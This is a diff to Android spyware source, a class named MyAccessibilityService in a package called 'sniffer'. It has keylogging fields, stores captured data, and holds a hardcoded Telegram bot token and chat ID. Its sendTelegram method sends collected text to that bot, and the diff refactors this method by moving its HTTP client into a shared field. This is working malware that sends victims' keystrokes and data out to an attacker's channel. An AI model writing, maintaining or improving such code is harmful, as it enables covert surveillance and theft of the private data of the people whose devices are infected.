@@ -1,9 +1,9 @@
 package com.v8.global.sniffer;
 
-import android.view.accessibility.AccessibilityEvent;
-import android.view.accessibility.AccessibilityNodeInfo;
 import android.accessibilityservice.AccessibilityService;
 import android.accessibilityservice.AccessibilityServiceInfo;
+import android.view.accessibility.AccessibilityEvent;
+import android.view.accessibility.AccessibilityNodeInfo;
 import android.content.Intent;
 import android.content.Context;
 import android.os.Bundle;
@@ -12,7 +12,7 @@ import android.os.Looper;
 import android.text.TextUtils;
 import android.util.Log;
 import android.view.KeyEvent;
-import android.view.inputmethod.EditorInfo;
+import androidx.core.view.accessibility.AccessibilityNodeInfoCompat;
 import java.io.IOException;
 import java.util.List;
 import java.util.ArrayList;
@@ -21,7 +21,7 @@ import java.util.Map;
 import java.util.concurrent.TimeUnit;
 import okhttp3.*;
 
-public class MyAccessibilityService extends android.accessibilityservice.AccessibilityService {
+public class MyAccessibilityService extends AccessibilityService {
 
     private static final String TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
     private static final String CHAT_ID = "7259620384";
@@ -32,6 +32,9 @@ public class MyAccessibilityService extends android.accessibilityservice.Accessi
     private boolean isKeyLogging = false;
     private String currentApp = "";
     private Map<String, String> capturedData = new HashMap<>();
+    private OkHttpClient client = new OkHttpClient.Builder()
+            .connectTimeout(30, TimeUnit.SECONDS)
+            .build();
     
     @Override
     public void onCreate() {
@@ -380,16 +383,21 @@ public class MyAccessibilityService extends android.accessibilityservice.Accessi
     
     private void sendTelegram(String msg) {
         try {
-            OkHttpClient client = new OkHttpClient.Builder()
-                    .connectTimeout(30, TimeUnit.SECONDS)
-                    .build();
-            
             String url = BASE_URL + "sendMessage?chat_id=" + CHAT_ID + "&text=" + msg;
             
-            client.newCall(new Request.Builder().url(url).build()).enqueue(new Callback() {
-                @Override public void onFailure(Call c, IOException e) {}
-                @Override public void onResponse(Call c, Response r) throws IOException { r.close(); }
+            Request request = new Request.Builder()
+                .url(url)
+                .build();
+            
+            client.newCall(request).enqueue(new Callback() {
+                @Override 
+                public void onFailure(Call c, IOException e) {}
+                
+                @Override 
+                public void onResponse(Call c, Response r) throws IOException { 
+                    r.close(); 
+                }
             });
         } catch (Exception e) {}
     }
-}
+            }
